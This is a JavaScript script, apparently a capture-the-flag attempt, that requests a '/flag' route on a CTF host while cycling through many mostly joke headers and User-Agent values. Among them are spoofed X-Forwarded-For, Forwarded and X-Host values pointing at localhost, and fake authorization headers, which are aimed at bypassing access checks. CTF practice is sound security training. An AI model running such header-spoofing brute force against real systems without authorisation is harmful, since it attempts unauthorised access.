import axios from "axios";

// Base URL
const baseUrl = "http://it-ctf.duckdns.org:49611";

// Target route
const flagRoute = `${baseUrl}/flag`;

// Default headers for experimentation
const headersList = [
  { "User-Agent": "LoveBot" },
  { "X-Love": "True" },
  { Referer: "http://unrequited.love" },
  { Connection: "close" },
  { "X-Love": "False" },
  { "User-Agent": "Mozilla/5.0 (LoveFail)" },
  { Authorization: "Bearer LoveToken" },
  { "X-Heart": "Broken" },
  { Cookie: "session=unrequited" },
  { Accept: "application/json" },
  { "Content-Type": "application/x-www-form-urlencoded" },
  { "X-Requested-With": "XMLHttpRequest" },
  { Origin: "http://it-ctf.duckdns.org" },
  { Host: "it-ctf.duckdns.org" },
  { "X-Custom": "OneSidedLove" },
  { "X-Override": "TrueLove" },
  { Pragma: "no-cache" },
  { "Cache-Control": "no-store" },
  { TE: "trailers" },
  { "Upgrade-Insecure-Requests": "1" },
  { "X-Love": "Maybe" },
  { "User-Agent": "curl/7.64.1" },
  { Referer: "http://no.love" },
  { "Accept-Language": "en-US,en;q=0.5" },
  { DNT: "1" },
  { "Keep-Alive": "timeout=5, max=100" },
  { "If-Modified-Since": "Sun, 26 Sep 2021 00:00:00 GMT" },
  { "If-None-Match": 'W/"etag123456"' },
  { "X-Forwarded-For": "127.0.0.1" },
  { Forwarded: "for=127.0.0.1" },
  { Via: "1.1 example.com" },
  { "Accept-Encoding": "gzip, deflate, br" },
  { Expect: "100-continue" },
  { "X-Do-Not-Disturb": "True" },
  { "X-Hope": "Fading" },
  { "Proxy-Authorization": "Basic dXNlcjpwYXNz" },
  { "Max-Forwards": "10" },
  { "Access-Control-Request-Headers": "authorization" },
  { "Access-Control-Request-Method": "POST" },
  { "Timing-Allow-Origin": "*" },
  { "X-Frame-Options": "deny" },
  { "X-XSS-Protection": "1; mode=block" },
  { "X-Content-Type-Options": "nosniff" },
  { "Content-Security-Policy": "default-src 'self'" },
  { "X-Love-Test": "HeaderTest" },
  { "X-Missing": "TrueLove" },
  { "X-Love-Version": "1.0" },
  { "X-Love-Type": "Unrequited" },
  { "X-Action": "LoveRequest" },
  { "X-Target": "Heart" },
  { "X-Origin": "Self" },
  { "X-Host": "localhost" },
  { "Proxy-Connection": "keep-alive" },
  { "X-Rejected": "Yes" },
  { "X-Accept": "No" },
  { "X-Love-Status": "Pending" },
  { "X-Alternative": "None" },
  { "X-Fail": "Forever" },
  { "X-Hope-Level": "0" },
  { "X-Hope-Level": "100" },
  { "X-Love-Intensity": "Infinite" },
  { "X-Broken": "True" },
  { "X-Recovery": "Impossible" },
  { "X-Love-Redirect": "Nowhere" },
  { "X-Sacrifice": "Complete" },
  { "X-Doubt": "Always" },
  { "X-Believe": "False" },
  { "X-Support": "None" },
  { "X-Cry": "True" },
  { "X-Trust": "Broken" },
  { "X-Commit": "Never" },
  { "X-Promise": "Empty" },
  { "X-Regret": "Always" },
  { "X-Excuse": "Endless" },
  { "X-Wait": "Forever" },
  { "X-Delay": "Eternal" },
  { "X-Persistence": "Failed" },
  { "X-Acceptance": "None" },
  { "X-Path": "Lost" },
  { "X-Hope": "Expired" },
  { "X-Passion": "Gone" },
  { "X-End": "Unwritten" },
  { "X-Begin": "Undefined" },
  { "X-Future": "Bleak" },
  { "X-Dreams": "Shattered" },
  { "X-Life": "Incomplete" },
  { "X-Goal": "Missed" },
  { "X-Objective": "Unreachable" },
  { "X-Love-Acceptance": "Zero" },
  { "X-Silence": "Endless" },
  { "X-Hope-Limit": "Negative" },
];

async function tryHeaders() {
  for (const headers of headersList) {
    console.log(`Testing with headers: ${JSON.stringify(headers)}`);
    try {
      const response = await axios.get(flagRoute, { headers });
      console.log("Response status:", response.status);
      console.log("Response text:", response.data);
      console.log("-".repeat(50));
    } catch (error) {
      console.error(
        `Error with headers ${JSON.stringify(headers)}:`,
        error.data
      );
    }
  }
}

async function bruteForceHeaders() {
  // Automate common User-Agent or header variations
  const userAgents = [
    "Mozilla/5.0",
    "LoveBot",
    "HeartBrokenBot",
    "curl/7.68.0",
    "OneSidedLove/1.0",
  ];

  for (const userAgent of userAgents) {
    const headers = { "User-Agent": userAgent };
    console.log(`Testing User-Agent: ${userAgent}`);
    try {
      const response = await axios.get(flagRoute, { headers });
      console.log("Response status:", response.status);
      console.log("Response text:", response.data);
      console.log("-".repeat(50));
    } catch (error) {
      console.error(`Error with User-Agent ${userAgent}:`, error.data);
    }
  }
}

(async function main() {
  console.log("Trying specific headers...");
  await tryHeaders();

  console.log("Brute-forcing User-Agent variations...");
  await bruteForceHeaders();
})();
